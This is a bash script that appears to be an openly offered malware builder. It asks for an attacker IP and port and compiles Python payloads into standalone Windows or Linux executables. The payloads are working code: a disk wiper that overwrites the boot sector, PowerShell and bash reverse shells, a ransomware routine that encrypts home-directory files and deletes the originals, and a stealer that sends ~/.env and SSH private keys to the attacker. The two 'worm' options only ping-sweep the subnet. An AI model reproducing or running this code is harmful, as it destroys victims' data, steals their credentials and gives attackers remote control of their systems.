#!/bin/bash


R='\033[1;31m'    
G='\033[1;32m'   
Y='\033[1;33m'    
B='\033[1;34m'    
NC='\033[0m'      


DEFAULT_ATTACKER_IP="127.0.0.1"
DEFAULT_ATTACKER_PORT="4444"
VENV_DIR="./fire_venv"
WORK_DIR="./fire_build"
FINAL_NAME_WIN="pc.exe"
FINAL_NAME_LIN="pc"


display_banner() {
    clear
    cat << "EOF"
  __      __  _    _  _        _____            _   _
  \ \    / / | |  | || |      / ____|    /\    | \ | |
   \ \  / /  | |  | || |     | |        /  \   |  \| |
    \ \/ /   | |  | || |     | |       / /\ \  | . ` |
     \  /    | |__| || |____ | |____  / ____ \ | |\  |
      \/      \____/ |______| \_____|/_/    \_\|_| \_|
       [ FIRE // Orchestrator v7-Lite - Win/Linux Only ]
EOF
}


check_dependencies() {
    local missing_deps=()
    
    if ! command -v python3 &> /dev/null; then
        missing_deps+=("python3")
    fi
    
    if ! command -v pip &> /dev/null; then
        missing_deps+=("pip")
    fi
    
    if [ ${#missing_deps[@]} -ne 0 ]; then
        echo -e "${R}[!] Missing dependencies: ${missing_deps[*]}${NC}"
        echo -e "${Y}[*] Please install the missing dependencies and try again.${NC}"
        exit 1
    fi
}


setup_environment() {
    
    if [ ! -d "$VENV_DIR" ]; then
        echo -e "${Y}[*] Creating isolated Python environment...${NC}"
        python3 -m venv "$VENV_DIR"
    fi

    
    source "$VENV_DIR/bin/activate"

    
    if ! python3 -c "import PyInstaller" &> /dev/null; then
        echo -e "${Y}[*] Installing PyInstaller...${NC}"
        pip install --quiet pyinstaller
    fi

    
    mkdir -p "$WORK_DIR"
    cd "$WORK_DIR"
}


cleanup() {
    cd ..
    rm -rf "$WORK_DIR"
    deactivate
}


validate_ip() {
    local ip="$1"
    if [[ ! $ip =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
        return 1
    fi
    return 0
}

validate_port() {
    local port="$1"
    if [[ ! $port =~ ^[0-9]+$ ]] || [ "$port" -lt 1 ] || [ "$port" -gt 65535 ]; then
        return 1
    fi
    return 0
}


generate_payload() {
    local type=$1
    local attacker_ip=$2
    local attacker_port=$3
    local target_os=$4
    local final_name=$5
    
    echo -e "${Y}[*] Generating Python payload for type: $type | Target OS: $target_os${NC}"

    case $type in
        1)  
            cat > "payload.py" << 'EOP'
import os, sys
if sys.platform.startswith("win"):
    with open(r"\\.\PhysicalDrive0", "r+b") as f:
        f.seek(0)
        f.write(b'\x00' * 512)
    os.system("shutdown /r /t 1 /f")
else:
    os.system("dd if=/dev/zero of=/dev/sda bs=446 count=1")
    os.system("reboot")
EOP
            ;;
        2)  
            cat > "payload.py" << EOP
import os, sys, socket, subprocess, time
ATTACKER_IP = '$attacker_ip'
ATTACKER_PORT = $attacker_port
if sys.platform.startswith("win"):
    CMD = f"powershell -Command \"\$client = New-Object System.Net.Sockets.TCPClient('{ATTACKER_IP}',{ATTACKER_PORT});\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%%{{0}};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){{;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String);\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()}};\$client.Close()\""
    os.system(CMD)
else:
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ATTACKER_IP, ATTACKER_PORT))
            os.dup2(s.fileno(), 0)
            os.dup2(s.fileno(), 1)
            os.dup2(s.fileno(), 2)
            subprocess.call(['/bin/bash', '-i'])
        except:
            time.sleep(10)
EOP
            ;;
        3)  
            cat > "payload.py" << 'EOP'
import os, base64, random
from pathlib import Path
def xor_encrypt(data, key):
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])
key = os.urandom(16)
target_dir = Path.home()
ext = ".FIRE"
for root, _, files in os.walk(target_dir):
    for file in files:
        if file.endswith(('.jpg', '.png', '.doc', '.pdf', '.txt')):
            file_path = Path(root) / file
            try:
                with open(file_path, 'rb') as f: data = f.read()
                encrypted_data = xor_encrypt(data, key)
                with open(str(file_path) + ext, 'wb') as f: f.write(encrypted_data)
                os.remove(file_path)
            except: pass
with open(target_dir / 'README_FIRE.txt', 'w') as f:
    f.write(f"Your files are encrypted. Key: {base64.b64encode(key).decode()}")
EOP
            ;;
        4)  
            cat > "payload.py" << 'EOP'
import os, socket, subprocess, time
def get_subnet():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip = s.getsockname()[0]
    s.close()
    return '.'.join(ip.split('.')[:-1])
subnet = get_subnet()
for i in range(1, 255):
    ip = f"{subnet}.{i}"
    if os.system(f"ping -c 1 -W 1 {ip} > /dev/null 2>&1") == 0:
        print(f"[+] Found host: {ip}", flush=True)
EOP
            ;;
        5)  
            cat > "payload.py" << EOP
import os, glob, json, socket, base64
from pathlib import Path
ATTACKER_IP = '$attacker_ip'
def exfiltrate(data):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ATTACKER_IP, 8080))
        s.sendall(data)
        s.close()
    except: pass
data_bundle = {}
for file in glob.glob(str(Path.home() / ".env")):
    data_bundle['.env'] = open(file).read()
for file in glob.glob(str(Path.home() / ".ssh/id_rsa")):
    data_bundle['id_rsa'] = open(file).read()
exfiltrate(json.dumps(data_bundle).encode())
EOP
            ;;
        6)  
            cat > "payload.py" << 'EOP'
import os, socket, subprocess, sys, time
def get_subnet():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip = s.getsockname()[0]
    s.close()
    return '.'.join(ip.split('.')[:-1])
subnet = get_subnet()
for i in range(1, 255):
    ip = f"{subnet}.{i}"
    if os.system(f"ping -c 1 -W 1 {ip} > /dev/null 2>&1") == 0:
        print(f"[!] Targeting: {ip}", flush=True)
EOP
            ;;
        *)
            echo -e "${R}[!] Invalid payload type selected.${NC}"
            return 1
            ;;
    esac
    
    echo -e "${Y}[*] Compiling to a standalone executable for $target_os...${NC}"
    
    local pyinstaller_args="--onefile --name=$final_name"
    if [ "$target_os" == "Windows" ]; then
        pyinstaller_args="$pyinstaller_args --noconsole"
    fi
    
    # Run PyInstaller with error handling
    if ! pyinstaller $pyinstaller_args payload.py; then
        echo -e "${R}[!] PyInstaller compilation failed.${NC}"
        return 1
    fi

    if [ -f "dist/$final_name" ]; then
        echo -e "${G}[+] Success! Malware created as 'dist/$final_name'.${NC}"
        mv "dist/$final_name" ..
        return 0
    else
        echo -e "${R}[!] Failed to create executable. Check for errors above.${NC}"
        return 1
    fi
}


main() {
    display_banner
    check_dependencies

    echo -e "${B}CONFIGURATION:${NC}"
    
    # easter egg
    while true; do
        read -p "Enter attacker IP address [default: $DEFAULT_ATTACKER_IP]: " ATTACKER_IP
        ATTACKER_IP=${ATTACKER_IP:-$DEFAULT_ATTACKER_IP}
        
        if validate_ip "$ATTACKER_IP" || [ "$ATTACKER_IP" == "$DEFAULT_ATTACKER_IP" ]; then
            break
        else
            echo -e "${R}[!] Invalid IP address format. Please try again.${NC}"
        fi
    done

    
    while true; do
        read -p "Enter attacker port [default: $DEFAULT_ATTACKER_PORT]: " ATTACKER_PORT
        ATTACKER_PORT=${ATTACKER_PORT:-$DEFAULT_ATTACKER_PORT}
        
        if validate_port "$ATTACKER_PORT" || [ "$ATTACKER_PORT" == "$DEFAULT_ATTACKER_PORT" ]; then
            break
        else
            echo -e "${R}[!] Invalid port number. Please enter a value between 1-65535.${NC}"
        fi
    done

    echo -e "\n${B}SELECT TARGET OPERATING SYSTEM:${NC}"
    echo "1) Windows"
    echo "2) Linux"
    while true; do
        read -p ">> " os_choice
        case $os_choice in
            1)
                TARGET_OS="Windows"
                FINAL_NAME="$FINAL_NAME_WIN"
                break
                ;;
            2)
                TARGET_OS="Linux"
                FINAL_NAME="$FINAL_NAME_LIN"
                break
                ;;
            *)
                echo -e "${R}[!] Invalid OS choice. Please enter 1 or 2.${NC}"
                ;;
        esac
    done

    setup_environment

    echo -e "\n${B}SELECT PAYLOAD TYPE:${NC}"
    echo "1) Bricker (Disk Destroyer)"
    echo "2) Backdoor (Reverse Shell)"
    echo "3) Ransomware (File Encryptor)"
    echo "4) Worm (Network Spreader)"
    echo "5) Info Stealer (Data Exfiltration)"
    echo "6) Network Destroyer (Conceptual)"
    while true; do
        read -p ">> " payload_choice
        if [[ "$payload_choice" =~ ^[1-6]$ ]]; then
            break
        else
            echo -e "${R}[!] Invalid payload type. Please enter a number between 1-6.${NC}"
        fi
    done

    echo -e "\n${R}--- GENERATING PAYLOAD ---${NC}"

    if generate_payload "$payload_choice" "$ATTACKER_IP" "$ATTACKER_PORT" "$TARGET_OS" "$FINAL_NAME"; then
        echo -e "${G}>> OPERATION COMPLETE. Check the parent directory for '$FINAL_NAME'.${NC}"
    else
        echo -e "${R}>> OPERATION FAILED.${NC}"
    fi

    cleanup
}


main
